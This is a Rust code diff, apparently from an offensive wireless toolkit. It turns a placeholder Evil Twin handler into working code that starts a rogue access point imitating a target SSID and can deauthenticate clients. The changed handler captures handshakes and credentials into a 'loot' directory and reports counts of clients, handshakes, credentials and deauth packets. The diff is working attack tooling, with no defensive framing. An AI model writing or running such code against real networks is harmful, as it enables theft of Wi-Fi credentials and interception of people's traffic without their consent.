@@ -1161,6 +1161,8 @@ fn handle_wifi_deauth(root: &Path, args: WifiDeauthArgs) -> Result<HandlerResult
 
 fn handle_wifi_evil_twin(root: &Path, args: WifiEvilTwinArgs) -> Result<HandlerResult> {
     use crate::wireless_native;
+    use rustyjack_wireless::evil_twin::{execute_evil_twin, EvilTwin, EvilTwinConfig};
+    use std::time::Duration;
 
     log::info!("Starting Evil Twin attack on SSID: {}", args.ssid);
 
@@ -1174,12 +1176,14 @@ fn handle_wifi_evil_twin(root: &Path, args: WifiEvilTwinArgs) -> Result<HandlerR
         bail!("Interface {} is not a wireless interface", args.interface);
     }
 
-    // Check wireless capabilities
-    let caps = wireless_native::check_capabilities(&args.interface);
-    if !caps.supports_injection {
+    // Check required tools are installed
+    let missing = EvilTwin::check_requirements()
+        .map_err(|e| anyhow::anyhow!("Failed to check requirements: {}", e))?;
+    if !missing.is_empty() {
         bail!(
-            "Interface {} does not support packet injection (required for Evil Twin)",
-            args.interface
+            "Missing required tools for Evil Twin: {}. Install with: apt install {}",
+            missing.join(", "),
+            missing.join(" ")
         );
     }
 
@@ -1189,8 +1193,34 @@ fn handle_wifi_evil_twin(root: &Path, args: WifiEvilTwinArgs) -> Result<HandlerR
     fs::create_dir_all(&loot_dir)
         .with_context(|| format!("creating loot directory: {}", loot_dir.display()))?;
 
-    // For now, return a placeholder - actual implementation would use hostapd/dnsmasq
-    // The rustyjack-wireless crate has the evil_twin module but it needs system integration
+    // Parse target BSSID if provided
+    let target_bssid = if let Some(ref bssid_str) = args.target_bssid {
+        Some(bssid_str.parse().map_err(|e| anyhow::anyhow!("Invalid BSSID: {}", e))?)
+    } else {
+        None
+    };
+
+    // Configure the Evil Twin attack
+    let config = EvilTwinConfig {
+        ssid: args.ssid.clone(),
+        channel: args.channel,
+        ap_interface: args.interface.clone(),
+        deauth_interface: None, // Could add second interface support later
+        target_bssid,
+        simultaneous_deauth: false, // Requires second interface
+        deauth_interval: Duration::from_secs(5),
+        duration: Duration::from_secs(args.duration),
+        open_network: args.open,
+        wpa_password: None,
+        capture_path: loot_dir.to_string_lossy().to_string(),
+    };
+
+    // Execute the attack with progress callback
+    let result = execute_evil_twin(config, Some(&loot_dir.to_string_lossy()), |msg| {
+        log::info!("Evil Twin: {}", msg);
+    })
+    .map_err(|e| anyhow::anyhow!("Evil Twin attack failed: {}", e))?;
+
     let data = json!({
         "ssid": args.ssid,
         "interface": args.interface,
@@ -1198,12 +1228,26 @@ fn handle_wifi_evil_twin(root: &Path, args: WifiEvilTwinArgs) -> Result<HandlerR
         "target_bssid": args.target_bssid,
         "duration": args.duration,
         "open_network": args.open,
-        "status": "started",
-        "loot_directory": loot_dir.display().to_string(),
-        "note": "Evil Twin attack requires hostapd and dnsmasq for full functionality"
+        "status": if result.stats.ap_started { "completed" } else { "failed" },
+        "clients_connected": result.stats.clients_connected,
+        "handshakes_captured": result.stats.handshakes_captured,
+        "credentials_captured": result.stats.credentials_captured,
+        "deauth_packets": result.stats.deauth_packets,
+        "attack_duration_secs": result.stats.duration.as_secs(),
+        "loot_directory": result.loot_path.display().to_string(),
+        "log_file": result.log_path.display().to_string(),
     });
 
-    Ok(("Evil Twin attack configured".to_string(), data))
+    let message = if result.stats.ap_started {
+        format!(
+            "Evil Twin complete: {} clients, {} handshakes captured",
+            result.stats.clients_connected, result.stats.handshakes_captured
+        )
+    } else {
+        "Evil Twin attack failed to start AP".to_string()
+    };
+
+    Ok((message, data))
 }
 
 fn handle_wifi_pmkid(root: &Path, args: WifiPmkidArgs) -> Result<HandlerResult> {
